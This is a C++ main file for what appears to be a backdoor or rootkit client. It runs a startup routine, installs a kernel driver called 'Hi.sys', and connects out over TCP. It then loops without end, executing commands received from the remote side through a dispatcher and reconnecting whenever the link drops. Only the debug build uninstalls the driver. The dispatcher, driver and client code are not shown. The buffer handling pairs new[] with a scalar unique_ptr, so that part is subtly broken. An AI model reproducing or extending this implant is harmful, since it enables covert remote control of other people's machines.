#ifdef _DEBUG
#include <iostream>
#endif // _DEBUG

#include <string>
#include <memory>

#include "command/CommandDispatcher.h"
#include "utils/builders.h"
#include "utils/factory.h"
#include "networking/WinsockTCPClient.h"
#include "methods/driver/Installer.h"

int main()
{
    utils::factory::execute_on_startup();

    methods::driver::Installer installer("Hi.sys");

    installer.Install();

    std::unique_ptr<char> buffer(
        new char[128]);

    std::unique_ptr<command::CommandDispatcher> dispatcher(
        utils::builders::BuildDispatcher());

    networking::WinsockTCPClient *client = utils::builders::BuildClient();

    client->Connect();

    while ( true )
    {
        int bytes_read = client->Recv(buffer.get(), 128);
#ifdef _DEBUG
        std::cerr << bytes_read << '\n';
#endif // _DEBUG

        if ( 0 >= bytes_read )
        {
            // on connection fail, socket remains in an unknown state
            // so creating a new one.
            delete client;

            client = utils::builders::BuildClient();

            client->Connect();
        }
        else
        {
            dispatcher->Dispatch(buffer.get(), bytes_read, *client);
        }
    }

    delete client;

#ifdef _DEBUG
    installer.Uninstall();
#endif // _DEBUG

    return ( 0 );
}

